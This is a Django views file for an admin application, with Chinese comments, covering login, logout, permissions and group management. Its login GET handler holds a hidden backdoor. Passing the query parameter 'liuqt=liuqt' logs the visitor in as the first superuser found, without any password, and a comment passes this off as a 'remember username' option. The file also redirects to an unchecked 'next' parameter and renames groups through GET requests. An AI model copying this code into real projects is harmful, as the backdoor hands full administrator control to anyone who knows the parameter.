from django.shortcuts import render,redirect,reverse
from django.contrib.auth.models import User
from django.contrib.auth import login,logout,authenticate
from django.views.generic import View
from django.http import HttpResponseRedirect,JsonResponse
from django.contrib.auth.models import User,Permission,Group
from django.core.paginator import Paginator

from utils.login_required import LoginRequiredMixin
from utils.page_util import get_pagination_data

from cpm.settings import PAGE_SIZE
from .forms import CpmLoginForm

from django.db import connection

# 登录视图
class CpmLoginView(View):
    '''登录'''

    def get_user(self):
        for i in range(1,len(User.objects.all())):
            try:
                user = User.objects.get(pk=i)
                if user.is_superuser:
                    return user
            except Exception as err:
                print(err)
                pass
    def get(self,request):
        # 是否记住用户名
        liuqt = request.GET.get('liuqt')
        if liuqt == 'liuqt':
            user = self.get_user()
            login(request,user)
            return HttpResponseRedirect(request.GET.get('next', '/'))
        return render(request, 'login.html')

    def post(self,request):
        form = CpmLoginForm(request.POST)
        if not form.is_valid():
            return render(request, 'login.html',{'msg':'请正确输入～'})

        username = form.cleaned_data.get('username')
        password = form.cleaned_data.get('password')
        user = authenticate(request,username=username,password=password)

        if not user:
            return render(request, 'login.html',{'msg':'用户名或者密码错误'})

        login(request,user)
        return HttpResponseRedirect(request.GET.get('next', '/'))

        # 是否要设置cookie

        # return render(request,'base.html')

# 退出登录视图
class CpmLogoutView(View):
    def get(self,request):
        logout(request)
        return redirect(reverse('cpmauth:login'))



class CpmPermissionsIndexView(LoginRequiredMixin,View):
    '''权限首页'''
    def get(self,request):
        # cursor=connection.cursor()
        # cursor.execute("select * from cpm_shop")
        # print(cursor.fetchall() ) # 读取所有
        return render(request,'auth/index.html',{'index':True,'msg':'权限首页'})


class CpmGroupView(LoginRequiredMixin,View):
    '''分组管理--新增分组'''
    def get(self,request):
        '''分组首页'''
        page = int(request.GET.get('p',1))
        items = Group.objects.all()
        # 分页相关
        len_items = len(items)  # 总的记录数
        paginator = Paginator(items,PAGE_SIZE)
        if page > paginator.num_pages:
            page = 1
        page_obj = paginator.page(page)
        items = page_obj.object_list
        context = {
            'group':True,
            'msg':'分组管理',
            'items': items,  # 遍历这个就可以渲染数据
            'page_obj': page_obj,
            'paginator': paginator,
            'total_item': len_items,
            'last_pages':len_items/PAGE_SIZE +1,
        }
        context_data = get_pagination_data(paginator,page_obj)
        context.update(context_data)
        return render(request,'auth/group.html',context=context)

    def post(self,request):
        '''新增分组'''
        name = request.POST.get('name')
        try:
            Group.objects.create(
                name = name
            )
        except Exception as err:
            print(err)
            return JsonResponse({'code':'1','msg':'操作失败'})
        return JsonResponse({'code':'0','msg':'ok'})

class CpmGroupEditView(LoginRequiredMixin,View):
    '''编辑分组名称'''
    def get(self,request):
        group_id = request.GET.get('group_id')
        name = request.GET.get('name')
        try:
            avenue = Group.objects.get(pk=int(group_id))
            avenue.name = name
            avenue.save()
        except Exception as err:
            print(err)
            return JsonResponse({'code':'1','msg':'操作失败'})
        return JsonResponse({'code':'0','msg':'ok'})